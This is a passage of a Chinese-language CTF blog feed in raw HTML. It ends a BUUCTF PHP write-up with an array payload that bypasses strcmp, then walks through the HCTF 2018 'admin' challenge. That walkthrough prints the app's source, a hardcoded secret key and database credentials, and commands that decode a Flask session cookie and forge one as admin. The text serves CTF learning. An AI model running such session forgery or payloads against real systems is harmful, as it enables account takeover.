class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/a0a4b9f2a114e466e5c70a8718a15b1b.png\"></p>\n<p>too long !!!!</p>\n<p>应该是strcmp函数检测到了长度</p>\n<p>money[]绕过</p>\n<p>最终payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">password<span class=\"token operator\">=</span><span class=\"token number\">404</span>a<span class=\"token operator\">&amp;</span>money<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">100000000</span>\n\ncookie<span class=\"token punctuation\">:</span>user<span class=\"token operator\">=</span><span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/fdbbce3df30ae8e9f07240a52c37e843.png\"></p>\n",
            "tags": [
                "web",
                "wp",
                "BUUCTF"
            ]
        },
        {
            "id": "https://0xdadream.github.io/2021/03/27/hctf-2018-admin/",
            "url": "https://0xdadream.github.io/2021/03/27/hctf-2018-admin/",
            "title": "HCTF_2018 admin",
            "date_published": "2021-03-27T15:25:00.000Z",
            "content_html": "<h2 id=\"HCTF-2018-admin\"><a href=\"#HCTF-2018-admin\" class=\"headerlink\" title=\"[HCTF 2018]admin\"></a>[HCTF 2018]admin</h2><p>进入页面，弱密码登录竟然成功了，得到了flag</p>\n<p>还是看看这道题的考点</p>\n<p>首页源代码中<code>&lt;!-- you are not admin --&gt;</code></p>\n<p>想试试二次注入好像不行</p>\n<p>随便注册一个账号登录</p>\n<p>登录后<code>post</code>里面试一下xss，也不行</p>\n<p>那就<code>change password</code>得到<code>&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</code></p>\n<p>下载，好像是源码，python我也不太懂</p>\n<p>接下来参考别人的wp</p>\n<h4 id=\"弱密码\"><a href=\"#弱密码\" class=\"headerlink\" title=\"弱密码\"></a>弱密码</h4><p>123，哈哈</p>\n<h3 id=\"flask-session伪造\"><a href=\"#flask-session伪造\" class=\"headerlink\" title=\"flask session伪造\"></a>flask session伪造</h3><p><code>index.html</code></p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\">{% include('header.html') %}\n{% if current_user.is_authenticated %}\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>nav<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>Hello {{ session['name'] }}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">&gt;</span></span>\n{% endif %}\n{% if current_user.is_authenticated and session['name'] == 'admin' %}\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>nav<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>hctf{xxxxxxxxx}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">&gt;</span></span>\n{% endif %}\n<span class=\"token comment\">&lt;!-- you are not admin --&gt;</span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>nav<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>Welcome to hctf<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">&gt;</span></span>\n\n{% include('footer.html') %}\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>{% if current_user.is_authenticated and session['name'] == 'admin' %}</code></p>\n<p>这说的是传入的<code>seesion</code>=<code>admin</code>就会执行后面的，意思差不都是登录admin，显示flag</p>\n<p><code>routes.py</code></p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#!/usr/bin/env python</span>\n<span class=\"token comment\"># -*- coding:utf-8 -*-</span>\n\n<span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask<span class=\"token punctuation\">,</span> render_template<span class=\"token punctuation\">,</span> url_for<span class=\"token punctuation\">,</span> flash<span class=\"token punctuation\">,</span> request<span class=\"token punctuation\">,</span> redirect<span class=\"token punctuation\">,</span> session<span class=\"token punctuation\">,</span> make_response\n<span class=\"token keyword\">from</span> flask_login <span class=\"token keyword\">import</span> logout_user<span class=\"token punctuation\">,</span> LoginManager<span class=\"token punctuation\">,</span> current_user<span class=\"token punctuation\">,</span> login_user\n<span class=\"token keyword\">from</span> app <span class=\"token keyword\">import</span> app<span class=\"token punctuation\">,</span> db\n<span class=\"token keyword\">from</span> config <span class=\"token keyword\">import</span> Config\n<span class=\"token keyword\">from</span> app<span class=\"token punctuation\">.</span>models <span class=\"token keyword\">import</span> User\n<span class=\"token keyword\">from</span> forms <span class=\"token keyword\">import</span> RegisterForm<span class=\"token punctuation\">,</span> LoginForm<span class=\"token punctuation\">,</span> NewpasswordForm\n<span class=\"token keyword\">from</span> twisted<span class=\"token punctuation\">.</span>words<span class=\"token punctuation\">.</span>protocols<span class=\"token punctuation\">.</span>jabber<span class=\"token punctuation\">.</span>xmpp_stringprep <span class=\"token keyword\">import</span> nodeprep\n<span class=\"token keyword\">from</span> io <span class=\"token keyword\">import</span> BytesIO\n<span class=\"token keyword\">from</span> code <span class=\"token keyword\">import</span> get_verify_code\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/code'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">get_code</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    image<span class=\"token punctuation\">,</span> code <span class=\"token operator\">=</span> get_verify_code<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># 图片以二进制形式写入</span>\n    buf <span class=\"token operator\">=</span> BytesIO<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    image<span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token string\">'jpeg'</span><span class=\"token punctuation\">)</span>\n    buf_str <span class=\"token operator\">=</span> buf<span class=\"token punctuation\">.</span>getvalue<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># 把buf_str作为response返回前端，并设置首部字段</span>\n    response <span class=\"token operator\">=</span> make_response<span class=\"token punctuation\">(</span>buf_str<span class=\"token punctuation\">)</span>\n    response<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">[</span><span class=\"token string\">'Content-Type'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'image/gif'</span>\n    <span class=\"token comment\"># 将验证码字符串储存在session中</span>\n    session<span class=\"token punctuation\">[</span><span class=\"token string\">'image'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> code\n    <span class=\"token keyword\">return</span> response\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">)</span>\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/index'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'index.html'</span><span class=\"token punctuation\">,</span> title <span class=\"token operator\">=</span> <span class=\"token string\">'hctf'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/register'</span><span class=\"token punctuation\">,</span> methods <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">register</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\n    <span class=\"token keyword\">if</span> current_user<span class=\"token punctuation\">.</span>is_authenticated<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'index'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    form <span class=\"token operator\">=</span> RegisterForm<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>method <span class=\"token operator\">==</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">:</span>\n        name <span class=\"token operator\">=</span> strlower<span class=\"token punctuation\">(</span>form<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'image'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> form<span class=\"token punctuation\">.</span>verify_code<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            flash<span class=\"token punctuation\">(</span><span class=\"token string\">'Wrong verify code.'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'register.html'</span><span class=\"token punctuation\">,</span> title <span class=\"token operator\">=</span> <span class=\"token string\">'register'</span><span class=\"token punctuation\">,</span> form<span class=\"token operator\">=</span>form<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> User<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span>filter_by<span class=\"token punctuation\">(</span>username <span class=\"token operator\">=</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>first<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            flash<span class=\"token punctuation\">(</span><span class=\"token string\">'The username has been registered'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'register'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        user <span class=\"token operator\">=</span> User<span class=\"token punctuation\">(</span>username<span class=\"token operator\">=</span>name<span class=\"token punctuation\">)</span>\n        user<span class=\"token punctuation\">.</span>set_password<span class=\"token punctuation\">(</span>form<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span>\n        db<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">)</span>\n        db<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">.</span>commit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        flash<span class=\"token punctuation\">(</span><span class=\"token string\">'register successful'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'login'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'register.html'</span><span class=\"token punctuation\">,</span> title <span class=\"token operator\">=</span> <span class=\"token string\">'register'</span><span class=\"token punctuation\">,</span> form <span class=\"token operator\">=</span> form<span class=\"token punctuation\">)</span>\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/login'</span><span class=\"token punctuation\">,</span> methods <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> current_user<span class=\"token punctuation\">.</span>is_authenticated<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'index'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    form <span class=\"token operator\">=</span> LoginForm<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>method <span class=\"token operator\">==</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">:</span>\n        name <span class=\"token operator\">=</span> strlower<span class=\"token punctuation\">(</span>form<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span>\n        session<span class=\"token punctuation\">[</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> name\n        user <span class=\"token operator\">=</span> User<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span>filter_by<span class=\"token punctuation\">(</span>username<span class=\"token operator\">=</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>first<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> user <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">not</span> user<span class=\"token punctuation\">.</span>check_password<span class=\"token punctuation\">(</span>form<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            flash<span class=\"token punctuation\">(</span><span class=\"token string\">'Invalid username or password'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'login'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        login_user<span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">,</span> remember<span class=\"token operator\">=</span>form<span class=\"token punctuation\">.</span>remember_me<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'index'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'login.html'</span><span class=\"token punctuation\">,</span> title <span class=\"token operator\">=</span> <span class=\"token string\">'login'</span><span class=\"token punctuation\">,</span> form <span class=\"token operator\">=</span> form<span class=\"token punctuation\">)</span>\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/logout'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">logout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    logout_user<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span><span class=\"token string\">'/index'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/change'</span><span class=\"token punctuation\">,</span> methods <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">change</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> current_user<span class=\"token punctuation\">.</span>is_authenticated<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'login'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    form <span class=\"token operator\">=</span> NewpasswordForm<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>method <span class=\"token operator\">==</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">:</span>\n        name <span class=\"token operator\">=</span> strlower<span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">[</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        user <span class=\"token operator\">=</span> User<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span>filter_by<span class=\"token punctuation\">(</span>username<span class=\"token operator\">=</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>first<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        user<span class=\"token punctuation\">.</span>set_password<span class=\"token punctuation\">(</span>form<span class=\"token punctuation\">.</span>newpassword<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span>\n        db<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">.</span>commit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        flash<span class=\"token punctuation\">(</span><span class=\"token string\">'change successful'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'index'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'change.html'</span><span class=\"token punctuation\">,</span> title <span class=\"token operator\">=</span> <span class=\"token string\">'change'</span><span class=\"token punctuation\">,</span> form <span class=\"token operator\">=</span> form<span class=\"token punctuation\">)</span>\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/edit'</span><span class=\"token punctuation\">,</span> methods <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>method <span class=\"token operator\">==</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">:</span>\n        \n        flash<span class=\"token punctuation\">(</span><span class=\"token string\">'post successful'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'index'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'edit.html'</span><span class=\"token punctuation\">,</span> title <span class=\"token operator\">=</span> <span class=\"token string\">'edit'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>errorhandler</span><span class=\"token punctuation\">(</span><span class=\"token number\">404</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">page_not_found</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    title <span class=\"token operator\">=</span> <span class=\"token builtin\">unicode</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span>\n    message <span class=\"token operator\">=</span> error<span class=\"token punctuation\">.</span>description\n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'errors.html'</span><span class=\"token punctuation\">,</span> title<span class=\"token operator\">=</span>title<span class=\"token punctuation\">,</span> message<span class=\"token operator\">=</span>message<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">strlower</span><span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    username <span class=\"token operator\">=</span> nodeprep<span class=\"token punctuation\">.</span>prepare<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> username<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>flask是用python写的web框架，session以cookie形式存在客户端</p>\n<p>接下来解码，再伪造session</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/eed00b048156fdebb04153288475cbd7.png\"></p>\n<p>拿到session</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\">session：\n.eJxFUM9rwjAU_lfGO3toQ70IXkatOHgvVNKGl4s4rbZp4qBV1Ij_-4Ib2_n7_T1gcxiasYXZebg0E9h0e5g94O0TZoCWU6nLK_rqjp4DWbKsyzvZPpOKnNRFT2IhZF5luOSb8ZyQLjyFtpXKucgLMi981AQMq4zVUVDeT03Od7YrQdZZ4xeB9fqHvzQew75F9eHJVkEuyykpvKEvE6ljdlhELSYm7wWHdWvUTlDYd6iqOTwnsBuHw-b81Tenvwmka4e6cLFChmqXGBXtremkNg5trGPfLfuiN7ZMWVWJ0euOr_OXXee3x-b_DFFn9S9y2voIQAoTuIzN8PoM0gSe3-wTbLg.YGAkfw.j_uEzvi-2vEKxpp7Xzgj-Iyw1bc<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>还需要SECRET_KEY</p>\n<p><code>config.py</code></p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> os\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Config</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    SECRET_KEY <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>environ<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'SECRET_KEY'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token string\">'ckj123'</span>\n    SQLALCHEMY_DATABASE_URI <span class=\"token operator\">=</span> <span class=\"token string\">'mysql+pymysql://root:adsl1234@db:3306/test'</span>\n    SQLALCHEMY_TRACK_MODIFICATIONS <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">SECRET_KEY</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">ckj123</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>脚本：<a href=\"https://github.com/noraj/flask-session-cookie-manager\">noraj/flask-session-cookie-manager: Flask Session Cookie Decoder/Encoder</a></p>\n<p>跑一下，得到</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">python flask_session_cookie_manager3<span class=\"token punctuation\">.</span>py decode <span class=\"token operator\">-</span>s ckj123 <span class=\"token operator\">-</span>c <span class=\"token punctuation\">.</span>eJxFUMFqwkAQ_ZUyZw9GzSXgQUgTFGZCwsZl9yLWxmQnuylERV3x37u10B4ew_B4b968B<span class=\"token operator\">-</span>yOY3PqIDmPl2YCO_MJyQPePiAB5PJOEqeK3<span class=\"token operator\">-</span>MiVbGSG4Mz6khsGblzStYzdFWHYhX_TO20wYBCVJbk<span class=\"token operator\">-</span>oq5iimtWIn<span class=\"token operator\">-</span>hrwOaO_kNlaJ4CMzq7iOtMuc8ngrpO606KyWlS0kOeJyXqSrK84yR6maY54Z8kEXNMQHrzjcyMPubY<span class=\"token operator\">-</span><span class=\"token operator\">-</span>XMJzAofTeNydv_pm<span class=\"token operator\">-</span>HuB0nqBvJoG2UJLddOcGS23PabWkNQOfe9JtPcir2NiHaJlFsvly864fdv8lzFsBt3<span class=\"token operator\">-</span>MsPeBQIimMDl1IyvziCawvMb0RFtXA<span class=\"token punctuation\">.</span>YGBYaw<span class=\"token punctuation\">.</span>SFJ0fvQ_rtos<span class=\"token operator\">-</span>TSz52cCzIIkQVY\n\n<span class=\"token punctuation\">{</span><span class=\"token string\">'_fresh'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'_id'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">b'2425c4b19869abb3ca55c28fae62da1092daffb2fb94e5b00f944ca912212826bea2b1aeb55fafc319fae8eede9cf6478003af4670ab72b255673b4e4bb39d34'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'csrf_token'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">b'458204258ef1f1beed09b5ff3935828e966ea1e1'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'image'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">b'2rgf'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'name'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'user_id'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'10'</span><span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>将<code>name</code>的值改为<code>admin</code>,编码</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">python flask3<span class=\"token punctuation\">.</span>py encode <span class=\"token operator\">-</span>s ckj123 <span class=\"token operator\">-</span>t <span class=\"token string\">\"{'_fresh': True, '_id': b'2425c4b19869abb3ca55c28fae62da1092daffb2fb94e5b00f944ca912212826bea2b1aeb55fafc319fae8eede9cf6478003af4670ab72b255673b4e4bb39d34', 'csrf_token': b'458204258ef1f1beed09b5ff3935828e966ea1e1', 'image': b'2rgf', 'name': 'admin', 'user_id': '10'}\"</span>\n\n<span class=\"token punctuation\">.</span>eJxFUMuKwkAQ_JWlzx7iIxfBg5BNUOgOCROHmYv4iMl0ZrIQFXXEf99ZF3YPRdMUVV1dT9iehvrcwvwyXOsRbM0R5k_42MMckIsHSYwUf8Z5omIl1wYn1JLYMHLrlKwm6MoWxTL<span class=\"token operator\">-</span>mdppgwG5KC3J1Q0zFVNSshLdHXkV0DzIra0SwUemVnE11i51yuM9l7rVorValjaX5IiLaZ4sbzhJHSVqillqyAdd0BAfvOJwIwu7tx36YgGvERzOw2l7<span class=\"token operator\">-</span>erq_u8FSqoZ8jIKspmW6q45NVpuOkysIakd<span class=\"token operator\">-</span>s6TaB55VsXEOkRLLRaLt51xu6b<span class=\"token operator\">-</span>L6Nf97r5ZfqdCwTsjs70MILruR7evcE4gtc3l5pvNA<span class=\"token punctuation\">.</span>YGBhyg<span class=\"token punctuation\">.</span>8mFsYTGotorfD6H7bsHdSTnxKQ4<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>然后用burp抓包，传入修改的session，得到flag</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/2da335133cf210becc8dd391024b9652.png\"></p>\n<h4 id=\"Unicode欺骗\"><a href=\"#Unicode欺骗\" class=\"headerlink\" 